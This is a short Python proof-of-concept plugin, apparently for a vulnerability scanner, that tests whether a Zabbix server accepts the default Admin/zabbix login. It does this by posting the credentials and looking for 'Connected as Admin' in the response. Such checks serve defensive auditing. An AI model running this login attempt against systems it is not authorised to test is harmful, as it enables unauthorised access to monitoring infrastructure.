#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  Zabbix Default Account Authentication 
Reference :  None
Author    :  NoName
"""

import  re

def assign(service, arg):
    if service == "zabbix":
        return True, arg
        
def audit(arg):
    url = arg + "/index.php"
    data = "request=&name=Admin&password=zabbix&autologin=1&enter=Sign+in"
    code, head, res, errcode, _ = curl.curl('-L "%s" -d "%s"' %(url,data))
    if code == 200:
        m = re.search("Connected as 'Admin'",res)
        if m:
            security_hole("Zabbix Default Account Authentication exist")

if __name__ == '__main__':
    from dummy import *
    audit(assign('zabbix', 'http://www.example.com/')[1])